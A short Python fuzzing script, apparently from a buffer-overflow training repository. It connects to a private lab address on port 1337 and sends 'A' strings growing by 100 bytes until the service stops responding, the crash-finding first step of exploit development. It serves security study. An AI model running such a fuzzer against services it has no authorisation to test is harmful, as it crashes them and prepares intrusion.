import socket
import time
import sys

#
# opinfosec
# Simple Fuzzer for Python3
# https://github.com/opsec-infosec/BufferOverflow
#

i = 100

try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect(("172.16.110.135", 1337))

except Exception as ex:
    print("Error Connecting: ", ex)
    sys.exit(1)


while (i < 3000):
    try:
        filler = "A" * i
        buffer = filler
        s.send(buffer.encode("latin-1"))

        print("Filler: ", len(filler), " Bytes")
        print("Sending Total: ", len(buffer), " Bytes\n")

        recv = s.recv(1024).decode("latin-1")
        if (recv == ''):
             raise Exception("No Data Received")
        time.sleep(1)

        i = i + 100

    except Exception as ex:
        print ("Error: ", ex)
        print("Filler: ", len(filler), " Bytes")
        print("Sending Total: ", len(buffer), " Bytes\n")
        s.close()
        i = 3001

s.close()
sys.exit(0)
